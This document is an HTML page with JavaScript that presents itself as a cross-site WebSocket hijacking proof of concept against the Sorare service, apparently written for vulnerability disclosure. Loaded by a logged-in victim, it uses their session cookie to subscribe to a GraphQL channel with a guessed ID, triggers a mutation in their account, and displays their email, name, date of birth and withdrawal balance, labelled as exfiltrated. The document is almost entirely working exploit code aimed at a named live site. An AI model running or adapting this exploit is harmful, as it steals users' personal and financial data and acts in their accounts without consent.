<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSWSH - Today's Prefix Pattern</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 10px; font-size: 12px; }
        .log { margin: 2px 0; white-space: pre-wrap; word-break: break-all; }
        .sent { color: #ff0; }
        .recv { color: #0ff; }
        .alert { color: #f00; font-weight: bold; font-size: 14px; }
        .success { color: #0f0; font-weight: bold; font-size: 13px; }
        .pii { color: #f0f; font-weight: bold; font-size: 14px; background: #220022; padding: 2px 4px; }
        .pattern { color: #fa0; }
        button { font-family: monospace; font-size: 14px; padding: 8px 16px; margin: 5px; cursor: pointer; }
        .trigger { background: #f00; color: #fff; font-weight: bold; }
    </style>
</head>
<body>
    <h2>CSWSH PoC - Aug 31 Prefix Pattern</h2>
    <button onclick="triggerPush()" class="trigger">CLICK AFTER SUBSCRIBING</button>
    <button onclick="location.reload()">Reload & New ID</button>
    <div id="log"></div>

<script>
function log(msg, cls='') {
    const line = document.createElement('div');
    line.className = 'log ' + cls;
    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    document.getElementById('log').appendChild(line);
    window.scrollTo(0, document.body.scrollHeight);
}

// Generate ID matching today's prefix cluster: 1a058 + random suffix
// Fallback to fully random if needed
function generateChannelId() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    
    // Strategy A: Match today's prefix cluster observed in DevTools (1a058...)
    // Prefix: 1a058 (5 chars), then 6 random chars = 11 total
    const todayPrefix = '1a058';
    let suffix = '';
    for (let i = 0; i < 6; i++) {
        suffix += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    const idA = todayPrefix + suffix; // e.g., 1a058x7y3z9a
    
    // Strategy B: Match 6-char prefix (1a0588... or 1a0589...)
    const todayPrefix6 = '1a058' + chars.charAt(Math.floor(Math.random() * 10)); // 1a0580-9
    let suffix6 = '';
    for (let i = 0; i < 5; i++) {
        suffix6 += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    const idB = todayPrefix6 + suffix6; // e.g., 1a0588fb272
    
    // Strategy C: Fully random (proven to work)
    let idC = '';
    for (let i = 0; i < 11; i++) {
        idC += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    // Use strategy B (6-char prefix matching today's cluster)
    return idB;
}

log('Page origin: ' + window.location.origin, 'sent');
log('Browser auto-attaches _sorare_session_id (SameSite=None)', 'info');

const channelId = generateChannelId();
log('GENERATED channelId (today prefix pattern): ' + channelId, 'success');
log('Pattern: prefix matches Aug 31 cluster (1a058...), 11 chars total', 'pattern');

const ws = new WebSocket('wss://ws.sorare.com/cable');
let subscribed = false;

ws.onopen = () => {
    log('WebSocket OPEN - 101 Switching Protocols', 'success');
    
    const subPayload = {
        command: "subscribe",
        identifier: JSON.stringify({
            channel: "GraphqlChannel",
            channelId: channelId
        })
    };
    ws.send(JSON.stringify(subPayload));
    log('SENT subscribe with GENERATED channelId', 'sent');
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    
    // Truncate long messages for display
    const display = JSON.stringify(data);
    log('RECV: ' + (display.length > 250 ? display.substring(0, 250) + '...' : display), 'recv');
    
    if (data.type === 'confirm_subscription') {
        log('!!! SUBSCRIPTION CONFIRMED - GENERATED ID ACCEPTED !!!', 'alert');
        subscribed = true;
        
        setTimeout(() => {
            // Use the EXACT payload from Additional Evidence (Aug 9)
            const msgPayload = {
                command: "message",
                identifier: JSON.stringify({
                    channel: "GraphqlChannel",
                    channelId: channelId
                }),
                data: JSON.stringify({
                    action: "execute",
                    operationId: "React/55edf449719f6474299d1bce5a9f36011df6fe4c0d34438c77c9b6543505836c",
                    operationName: "onCurrentUserWasUpdated",
                    query: null,
                    variables: {
                        sport: "FOOTBALL",
                        notificationCategories: [],
                        importantNotificationCategories: []
                    }
                })
            };
            ws.send(JSON.stringify(msgPayload));
            log('SENT onCurrentUserWasUpdated subscription', 'sent');
            log('>>> NOW CLICK RED BUTTON, THEN NAVIGATE IN SORARE TAB <<<', 'alert');
        }, 500);
    }
    
    if (data.message && data.message.result) {
        const result = data.message.result;
        
        if (result.errors) {
            log('GraphQL error: ' + JSON.stringify(result.errors).substring(0, 200), 'alert');
        }
        
        if (result.data) {
            log('!!! AUTHENTICATED DATA FRAME RECEIVED !!!', 'alert');
            log(JSON.stringify(result.data, null, 2), 'recv');
            
            const u = result.data.currentUserWasUpdated;
            if (u) {
                if (u.email) log('EXFILTRATED EMAIL: ' + u.email, 'pii');
                if (u.slug) log('EXFILTRATED SLUG: ' + u.slug, 'pii');
                if (u.nickname) log('EXFILTRATED NICKNAME: ' + u.nickname, 'pii');
                if (u.firstName) log('EXFILTRATED FIRST NAME: ' + u.firstName, 'pii');
                if (u.lastName) log('EXFILTRATED LAST NAME: ' + u.lastName, 'pii');
                if (u.dob) log('EXFILTRATED DOB: ' + u.dob, 'pii');
                if (u.availableBalanceForWithdrawal !== undefined) 
                    log('EXFILTRATED BALANCE: ' + u.availableBalanceForWithdrawal, 'pii');
            }
        }
    }
};

function triggerPush() {
    if (!subscribed) {
        log('Wait for subscription confirmation first!', 'alert');
        return;
    }
    log('Sending ping/mutation to trigger server push...', 'sent');
    
    // Send a dummy mutation that might trigger state update
    const triggerPayload = {
        command: "message",
        identifier: JSON.stringify({
            channel: "GraphqlChannel",
            channelId: channelId
        }),
        data: JSON.stringify({
            action: "execute",
            query: "mutation { markNotificationsAsRead(input: {}) { currentUser { id } } }"
        })
    };
    ws.send(JSON.stringify(triggerPayload));
    log('Sent trigger mutation. Now navigate in Sorare tab!', 'sent');
}

ws.onerror = (e) => log('ERROR', 'alert');
ws.onclose = (e) => log('CLOSED code=' + e.code, 'alert');
</script>
</body>
</html>
